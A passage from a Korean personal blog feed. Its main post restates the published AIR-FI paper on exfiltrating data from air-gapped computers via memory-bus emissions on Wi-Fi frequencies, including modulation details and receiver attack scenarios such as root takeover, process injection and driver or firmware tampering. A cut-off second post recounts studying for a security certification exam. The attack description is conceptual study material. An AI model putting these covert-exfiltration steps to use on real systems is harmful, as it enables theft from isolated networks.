  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sec7-실제-실험-방식-차후-수정본에서-업로드&quot; id=&quot;markdown-toc-sec7-실제-실험-방식-차후-수정본에서-업로드&quot;&gt;Sec7) 실제 실험 방식 (차후 수정본에서 업로드)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sec8-countermeasures-차후-수정본에서-디테일-업로드&quot; id=&quot;markdown-toc-sec8-countermeasures-차후-수정본에서-디테일-업로드&quot;&gt;Sec8) Countermeasures (차후 수정본에서 디테일 업로드)&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#81-물리적-분리&quot; id=&quot;markdown-toc-81-물리적-분리&quot;&gt;8.1. 물리적 분리&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#82-runtime-detection&quot; id=&quot;markdown-toc-82-runtime-detection&quot;&gt;8.2. Runtime Detection&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#83-memory-access-monitor&quot; id=&quot;markdown-toc-83-memory-access-monitor&quot;&gt;8.3. Memory Access Monitor&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#84-wi-fi-monitoring&quot; id=&quot;markdown-toc-84-wi-fi-monitoring&quot;&gt;8.4. Wi-Fi Monitoring&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#85-signal-jamminghw&quot; id=&quot;markdown-toc-85-signal-jamminghw&quot;&gt;8.5. Signal Jamming(H/W)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#86-signal-jammingsw&quot; id=&quot;markdown-toc-86-signal-jammingsw&quot;&gt;8.6. Signal Jamming(S/W)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#87-faraday-shielding&quot; id=&quot;markdown-toc-87-faraday-shielding&quot;&gt;8.7. Faraday Shielding&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;마인드맵-정리본&quot;&gt;마인드맵 정리본&lt;/h1&gt;
&lt;div style=&quot;position: relative; width: 100%; height: 0; overflow: hidden; padding-bottom: 80%;&quot;&gt;
&lt;iframe src=&quot;https://xmind.app/embed/iUU64D&quot; style=&quot;position: absolute; top:0; left:0; width:100%; height: 100%; max-width: 1080px; max-height: 720px;&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;들어가기에-앞서&quot;&gt;들어가기에 앞서&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이번에 읽은 논문은 &lt;mark&gt; AIR-FI: Leaking Data From Air-Gapped Computers Using Wi-Fi Frequencies &lt;/mark&gt; (저자: Mordechai Guri)이다. 저작권을 존중해 최대한 쉬운 말로 개념을 설명하는 선에서 글을 끝낼 것이다. 원문을 보고 싶다면, &lt;a href=&quot;https://ieeexplore.ieee.org/document/9808153&quot;&gt;이쪽&lt;/a&gt;에서 구독이나 구매 혹은 대학생 신분을 입증하고 무료로 pdf를 받아 보길 바란다.&lt;/p&gt;

&lt;p&gt;학교에서 교수님께 추천받아 읽은 논문인데, 정말 글을 잘 썼다는 생각이 들어 읽으면서 writing에 대해 다시 생각해 보게 된 논문이다. 근데 이 교수님은 추천해 주시는 논문마다 수작이더라… 어떻게 찾으셨어요 물어보고 싶다&lt;/p&gt;

&lt;p&gt;원래는 취미로 논문을 읽는데, 아니 이렇게 말하니까 되게 이상한데 근데 힘들여 읽는 게 아니고 전체를 이해하는 선에서 간단히 끝내는 식으로… 흥미가 가는 주제만 골라서… 그런 거라 정말 취미 독서 수준이다. 아무튼 이렇게 가볍게 읽고 넘겨버리니까 묘하게 휘발성인 느낌이라 앞으로 한 편 읽을 때마다 독후감을 남기기로 했다.&lt;/p&gt;

&lt;p&gt;(이번 논문은 기말고사 프로젝트 용으로 추천받은 거라 조원들과 공유하려고 더 세세하게 썼다)&lt;/p&gt;

&lt;p&gt;개인적으로 피지컬 레이어가 포함된 보안 관련 연구를 좋아해서 더 재밌게 읽었다. 특히 사이드 채널 어택은 너무나도 인디아나 존스의 보물찾기 느낌이라 좋아한다구!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;sec3-공격-모델-이원적&quot;&gt;Sec3) 공격 모델: 이원적&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;개요&quot;&gt;개요&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Transmitter가 CPU-DDR SDRAM 간 데이터 전송을 조절한다(RAM 모델명이 DDR4-x라고 치면 x는 최대 몇 MHz로 데이터를 보낼 수 있는지를 의미한다. 따라서 순정 상태일 때 어떤 램이 방출하는 전자기파는 x MHz다).&lt;/p&gt;

    &lt;p&gt;→ 이는 CPU의 오버클럭, 언더클럭으로 조정한다.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;해당 데이터 버스에서 데이터가 전기 신호로 오갈 때마다 방출되는 전기 신호의 주파수를 2.4GHz 와이파이 채널 대역과 맞추어 와이파이 신호로서 해독될 수 있게 한다.&lt;/li&gt;
  &lt;li&gt;그렇게 방출된 와이파이 신호를, 다양한 아키텍처 레이어에서 조작한 와이파이 Receiver를 이용해 해독하여 Usable한 데이터 포맷으로 만든다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;transmitter&quot;&gt;Transmitter&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Air-gapped workstation&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;receiver&quot;&gt;Receiver&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Transmitter가 Wi-fi signal emission 하면 그걸 받아챙기는 Wi-fiable 디바이스&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;sec4-ddr-sdram-wi-fi-배경지식-다들-알-것-같아서-생략&quot;&gt;Sec4) DDR SDRAM, Wi-Fi 배경지식 (다들 알 것 같아서 생략)&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;(그치만 혹시나 하는 마음에 간략하게 써둠)&lt;/p&gt;

&lt;p&gt;DDR4-2400이라고 하면 2400MHz로 데이터를 전송할 수 있는 거고, 이때 데이터 버스에서는 2400MHz 주파수의 전자기파가 발생한다. 여기에 착안하여 데이터 버스에 데이터가 오고가는 속도를 조절해서 2.4Ghz 와이파이 대역의 채널에 데이터 버스에서 발산되는 주파수를 맞출 수 있지 않을까 하게 된 게 아이디어의 핵심이다. 이후 논문에는 CPU 클럭과 DDR-SDRAM의 대역폭 간의 관계를 안다는 전에 하에 설명이 이어지기 때문에, 만일 이해가 힘들 것 같다면 관련 개념을 훑어보고 오는 것을 추천한다.&lt;/p&gt;

&lt;p&gt;Wi-Fi는 현재 802.11b/g/n이 제일 많이 쓰이는데, 이들은 와이파이 대역폭을 14개의 채널로 나누고 각 채널은 20MHz의 대역폭을 가진다. 보통 1~13 채널까지는 각 채널 간에 5MHz의 공간을 두고 배치되고, 13채널과 14채널은 12MHz의 공간을 두고 배치된다. 이 14개 채널 중 전세계에서 공통으로 사용 가능한 채널은 1~11채널인 11개 채널뿐이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;sec5-sendertransmissin-입장의-기작&quot;&gt;Sec5) Sender(transmissin) 입장의 기작&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;51-signal-generation&quot;&gt;5.1. Signal Generation&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;511-전자기-신호-방출&quot;&gt;5.1.1. 전자기 신호 방출&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Persistent Emission&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;: 그냥 언제나 방출되는 전자기 신호.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;dl&gt;
      &lt;dt&gt;&lt;strong&gt;Triggered Emission&lt;/strong&gt;&lt;/dt&gt;
      &lt;dd&gt;데이터 버스에서 데이터가 오고갈 때만 발생하는 전자기 신호로, 이 논문의 익스플로잇에 사용됨&lt;/dd&gt;
    &lt;/dl&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;512-wi-fi-신호를-어떻게-생성할-것인가&quot;&gt;5.1.2. Wi-Fi 신호를 어떻게 생성할 것인가?&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Memory Operations&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;: 요즘 DDR SDRAMS 전송속도가 802.11b/g/n 채널 주파수 대역에 걸쳐 있어서 가능한 방법. 데이터 버스에 데이터가 오고가는 걸 이용함&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;dl&gt;
      &lt;dt&gt;&lt;strong&gt;Memory Operations + Clocking&lt;/strong&gt;&lt;/dt&gt;
      &lt;dd&gt;만약 CPU 클럭이 못 받쳐주면 CPU 클럭을 BIOS/UEFI로 조정해서(이걸 손대는 악성코드 되게 많음) 버스에서 와이파이 대역과 일치하는 주파수의 전자기파가 방출되게 만듦&lt;/dd&gt;
    &lt;/dl&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;513-wi-fi-채널-간섭-현상은-어떻게-해결할-것인가&quot;&gt;5.1.3. Wi-Fi 채널 간섭 현상은 어떻게 해결할 것인가?&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2.44000 GHz 대역으로 데이터를 방출한다고 치면 채널 5~8에 모두 걸치는 대역이 되는데, 이는 타이밍 변수를 조절해서 한 채널만을 이용한 데이터 전송을 구현할 수 있으니 해결된다. 실제로 802.11b/g/n 의 채널별로 맞추어서 신호 송신을 해냈음.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;52-signal-modulation&quot;&gt;5.2. &lt;strong&gt;Signal Modulation&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;언제:
    &lt;ul&gt;
      &lt;li&gt;Wifi standard상으로 한 비트를 읽는 데 들이는 시간인 Bit time 동안&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;전송하려는 데이터가 1이면:
    &lt;ul&gt;
      &lt;li&gt;데이터를 array에서 array로 옮기며 버스에서 전자기파가 방출되게 한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;전송하려는 데이터가 0이면 :
    &lt;ul&gt;
      &lt;li&gt;아무것도 하지 않는다. 주파수를 맞추기 위하여 PWM(Pulse-Width Modulation) 기술을 사용해서 푸리에 변환을 통해 캐리어 파동(연속파동)상에 직사각파(펄스파, 불연속파동)를 구현한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;캐싱은 어떻게 피하는가?:
    &lt;ul&gt;
      &lt;li&gt;1이 n 번 전송되면 array를 randomize 한다.&lt;/li&gt;
      &lt;li&gt;아니면 몇 개 array를 사용해서 그 중 사용할 array를 랜덤하게 선택하든가.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;멀티코어 구조를 이용할 수도 있음. governor 쓰레드의 통제를 받는 멀티스레딩을 통해서 한번에 발산하는 전자기파가 중첩이 되어 신호가 더 강해지게 하는 것.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;53-data-transmission&quot;&gt;5.3. &lt;strong&gt;Data Transmission&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;패킷 구조는 어떻게 구성할 것인가?
    &lt;ul&gt;
      &lt;li&gt;Pre-amble: 패킷들을 구분하기 위한 헤더&lt;/li&gt;
      &lt;li&gt;Payload: 모두가 아는 그것&lt;/li&gt;
      &lt;li&gt;Error Detection: CRC-8 사용함&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;sec6-receiver-입장의-기작&quot;&gt;Sec6) Receiver 입장의 기작&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;61-개요&quot;&gt;6.1. 개요&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해커는 Receiver의 물리 레이어로 들어오는 raw data를 가져와야 한다. 이는 manufacturer가 기본 제공하는 UI를 사용해서도, WiFi 칩의 드라이버나 펌웨어를 변조해서도 가능하다. 이렇게 가져온 raw data를 소프트웨어 스택으로 던져주면 디코딩 등의 과정을 거쳐 usable data 가 된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;62-physical-layer에-접근-가능한-wifi-스택의-레이어&quot;&gt;6.2. Physical Layer에 접근 가능한 Wifi 스택의 레이어&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;621-application-layer-user-level&quot;&gt;6.2.1. Application Layer (user-level)&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;설명:&lt;/strong&gt;
Command-line tools, Userspace APIs(Linux OS), Device I/O control(Windows OS)
을 통해 커널에서 유저애플리케이션으로 데이터 전송&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;공격 시나리오:&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;공격자가 디바이스의 루트 권한 탈취&lt;/li&gt;
      &lt;li&gt;WiFi 물리 레이어 모니터링용 프로세스나 스레드 시작&lt;/li&gt;
      &lt;li&gt;쉘코드 인젝션이나 쓰레드 인젝션을 통해 프로세스 인젝션을 수행해 보안 기능 회피&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;622-device-drivers-layer-kernel-layer&quot;&gt;6.2.2. Device-Drivers Layer (kernel-layer)&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;설명:&lt;/strong&gt;
보통 칩셋들은 물리 레이어로 들어온 정보를 디바이스 드라이버(커널 레벨에서 돌아감)에게 토스함.
보통 물리 레이어로 들어온 정보를 ioctl 커맨드로 받아감.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;공격 시나리오:&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;공격자가 디바이스를 원격으로 익스함&lt;/li&gt;
      &lt;li&gt;권한 상승 기법으로 커널스페이스에 코드 인젝션&lt;/li&gt;
      &lt;li&gt;인젝션된 코드가 와이파이 모듈에서 직접 정보를 쿼리해 오거나, 아니면 와이파이 드라이버를 변조하거나 replace해서 원하는 대로 동작하게 함&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;623-firmware-level&quot;&gt;6.2.3. Firmware-Level&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;설명:&lt;/strong&gt;
임베디드 기기들이 와이파이 칩 관리에 펌웨어를 사용함. 그리고 보통 이 펌웨어는 OS를 탑재함. 즉 와이파이 칩 내부에서 모든 레이어의 연산이 이루어짐.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;공격 시나리오:&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;공격자가 디바이스를 원격으로 익스함.&lt;/li&gt;
      &lt;li&gt;와이파이 펌웨어를 변조함(이때 커널스페이스를 돌리고, 펌웨어 파일 시스템을 변조할 수 있는 루트 권한이 필요해 매우 높은 수준의 기술이 필요함)&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;624-attack-surface-설정&quot;&gt;6.2.4. Attack Surface 설정&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;방법 1은 업자들이 다 엠바고를 걸어서 정보가 없음. 따라서 방법 2와 방법 3이 유효함. 방법 3은 정말 높은 수준의 기술이 필요하지만 공격자들은 할 수 있음.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;sec7-실제-실험-방식-차후-수정본에서-업로드&quot;&gt;Sec7) 실제 실험 방식 (차후 수정본에서 업로드)&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;(지금 이걸 구조화해서 쉽게 쓰기엔 배고파서 못하겠다… 밥먹고 할래 근데 엄청난 지점: VM상에서도 가능하다는 것. 피지컬 레이어가 복합된 VM 익스라고도 부를 수 있을 듯)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;sec8-countermeasures-차후-수정본에서-디테일-업로드&quot;&gt;Sec8) Countermeasures (차후 수정본에서 디테일 업로드)&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;81-물리적-분리&quot;&gt;8.1. 물리적 분리&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;TEMPEST 쓰라는 말이다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;82-runtime-detection&quot;&gt;8.2. Runtime Detection&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;83-memory-access-monitor&quot;&gt;8.3. Memory Access Monitor&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;84-wi-fi-monitoring&quot;&gt;8.4. Wi-Fi Monitoring&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;85-signal-jamminghw&quot;&gt;8.5. Signal Jamming(H/W)&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;86-signal-jammingsw&quot;&gt;8.6. Signal Jamming(S/W)&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;87-faraday-shielding&quot;&gt;8.7. Faraday Shielding&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 29 May 2023 02:59:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/paper_study/air-fi</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/paper_study/air-fi</guid>
      </item>
    
      <item>
        <title>정보보안기사 동회차 합격 후기</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-intro&quot; id=&quot;markdown-toc-0-intro&quot;&gt;0. Intro&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-필기-221221230310&quot; id=&quot;markdown-toc-1-필기-221221230310&quot;&gt;1. 필기 (22.12.21~23.03.10)&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#10-내-배경지식-설명&quot; id=&quot;markdown-toc-10-내-배경지식-설명&quot;&gt;1.0. 내 배경지식 설명&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#11-필기-교재&quot; id=&quot;markdown-toc-11-필기-교재&quot;&gt;1.1. 필기 교재&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#12-공부-방법&quot; id=&quot;markdown-toc-12-공부-방법&quot;&gt;1.2. 공부 방법&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#공부-시간&quot; id=&quot;markdown-toc-공부-시간&quot;&gt;공부 시간&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#교재-공부&quot; id=&quot;markdown-toc-교재-공부&quot;&gt;교재 공부&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#13-결과&quot; id=&quot;markdown-toc-13-결과&quot;&gt;1.3. 결과&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-실기-230312--230422&quot; id=&quot;markdown-toc-2-실기-230312--230422&quot;&gt;2. 실기 (23.03.12 ~ 23.04.22)&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#20-배경-상황-설명&quot; id=&quot;markdown-toc-20-배경-상황-설명&quot;&gt;2.0. 배경 상황 설명&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#21-실기-교재&quot; id=&quot;markdown-toc-21-실기-교재&quot;&gt;2.1. 실기 교재&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-공부-방법&quot; id=&quot;markdown-toc-22-공부-방법&quot;&gt;2.2. 공부 방법&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#공부-시간-1&quot; id=&quot;markdown-toc-공부-시간-1&quot;&gt;공부 시간&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#공부-전략&quot; id=&quot;markdown-toc-공부-전략&quot;&gt;공부 전략&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-결과&quot; id=&quot;markdown-toc-23-결과&quot;&gt;2.3. 결과&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;0-intro&quot;&gt;0. Intro&lt;/h1&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;2022년 12월 21일부터 2023년 4월 22일까지의 레이스가 끝났다. 정보보안기사 동회차 합격이라는 결과로.&lt;/p&gt;

&lt;p&gt;합격했다는 점에서 끝났다는 뜻이지 사실 끝난 건 아니다… 공부에 끝이 있을 리가 없잖아.&lt;/p&gt;

&lt;p&gt;이번이 첫 도전이었고, 이렇게 한방에 붙을 줄 몰랐는데 나도 어이가 없어서 어안이 벙벙하다. 아침에 눈도 못 뜬 채로 핸드폰을 봤는데 최종합격 문자가 와있어서 진짜 침대에서 떨어질 뻔 했잖아…&lt;/p&gt;

&lt;p&gt;아무튼, 붙은 김에 내가 어떻게 공부를 했는지 한 번 써보려 한다. 필기 준비할 땐 그나마 정보가 있었는데, 실기 준비할 땐 정보가 거의 없다시피해서 마음고생을 좀 했기 때문이다.&lt;/p&gt;

&lt;p&gt;각설하고, 이제 본격적으로 설명해보겠다.
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-필기-221221230310&quot;&gt;1. 필기 (22.12.21~23.03.10)&lt;/h1&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;10-내-배경지식-설명&quot;&gt;1.0. 내 배경지식 설명&lt;/h2&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;이 글을 읽는 사람들은 정보보안기사 공부를 위해 자료수집을 하고 있는 중일 것이다. 그래서 1.0절의 내용은 최대한 자세히 서술했다.&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;읽는 게 귀찮은 사람들을 위해 한 줄 요약 하자면, “나는 정보보안 관련해 넓고 얕게 공부해 왔다”는 내용이다.&lt;/li&gt;
  &lt;/ul&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;
먼저 나는 정보보안학을 전공한 5학년(…) 학생이다. 그래 나 초과학기생이다…..&lt;/p&gt;

&lt;p&gt;학교 공부가 재밌어서 전공 교과목들은 거의 다 A+ 아니면 A를 받았고, 21년에는 BoB 10기 취약점분석트랙을 이수한 바 있다. 
방학 동안에는 포너블과 리버싱을 공부했었고, 어셈블리를 이때 독학으로 끝냈다.&lt;/p&gt;

&lt;p&gt;전공 과목 공부 시에는 단순히 제시되는 내용만 공부하지 않고 논리적으로 빈 구멍이 없어져 내가 납득할 수 있을 때까지 깊게 공부하는 방식을 취했다. 어느 정도로 깊게 팠었냐면, 디지털 포렌식을 실습하는 과제 하나로 A4 80페이지 정도 분량을 제출하거나 해킹 실습 과제를 할 때 이것에 관여하는 OS의 보안체계나 API등을 전부 연결시켜 과정을 설명했던 적이 있었고 모든 전공 과제를 이런 식으로 했던 정도였다.&lt;/p&gt;

&lt;p&gt;추가로 학부 졸업 프로젝트로 정보보안 위험관리를 관리적, 물리적, 기술적 보안으로 나누어 각 정보자산에 대해 수행하는 프로그램의 서버와 데이터베이스를 만들고 관리한 적이 있다. 이때 내 코드의 보안성을 보장할 방법에 대해서도 생각했다.&lt;/p&gt;

&lt;p&gt;대외적으로는 랜섬웨어 TTPs에 대해 접한 게 많고, 블록체인 기반 가상자산에 대해서도 귀동냥한 게 많다. 최신 트렌드에 관심이 많아 새로운 기술과 굵직한 신규 CVE들을 업데이트하고 있고, 안드로이드 커널 퍼징을 하고 싶어 이것저것 알아본 적도 있다. 논문 읽는 것도 좋아해서 밥 먹으면서 갉작갉작 읽은 논문이 조금 된다.
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;셀프 신상털이를 하려는 게 아니다. 내가 보안기사 시험을 준비하기 전까지 쌓아 왔던 배경 지식이 이렇다는 것이다. 이제부터 이 글을 읽을 때 꼭, 꼭 내 배경을 감안해서 이해하길 부탁한다. 그래야 독자 자신도 스스로에게 맞는 계획을 세울 수 있을 테니까.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-필기-교재&quot;&gt;1.1. 필기 교재&lt;/h2&gt;
&lt;p&gt;&lt;br /&gt;
필기 교재는 알기사 정보보안기사 교재를 사용했다. 
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;12-공부-방법&quot;&gt;1.2. 공부 방법&lt;/h2&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;공부-시간&quot;&gt;공부 시간&lt;/h3&gt;

&lt;p&gt;22년 12월 21일부터 23년 3월 1일까지는 방학 기간이었다. 기말고사가 끝난 직후부터 매일같이 아침 10시부터 밤 10시까지 공부했다. 이렇게 하니 12시간을 꼬박 공부한 것 같지만, 밥먹고 운동하고 씻고 여가시간도 가져가면서 했기 때문에 하루 평균 순 공부시간은 6시간이었다 ㅋㅋㅋㅋㅋㅋㅋ&lt;/p&gt;

&lt;h3 id=&quot;교재-공부&quot;&gt;교재 공부&lt;/h3&gt;

&lt;p&gt;먼저 난 필기는 독학으로 공부했다. 알기사 교재를 샀고, 읽었다. 1회독을 끝낸 다음 마지막 2주 동안은 한 번 더 회독을 했다. 기출문제는 사실 거의 못 풀었다. 교재 2회독이 전부였다… 써놓고 보니 허망하네&lt;/p&gt;

&lt;p&gt;내가 교재를 공부했던 세부 방식은 아래와 같다.
&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;교재의 챕터를 나열한 표를 만들어 필기시험날까지 하루 얼마나 공부를 해야 하는가를 설정했다.
    &lt;ul&gt;
      &lt;li&gt;이는 챕터를 빼먹고 공부하는 것, 그리고 하루에 얼마나 양을 편성해야 하는지 감을 못 잡고 시간을 낭비하는 불상사를 막기 위함이었다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
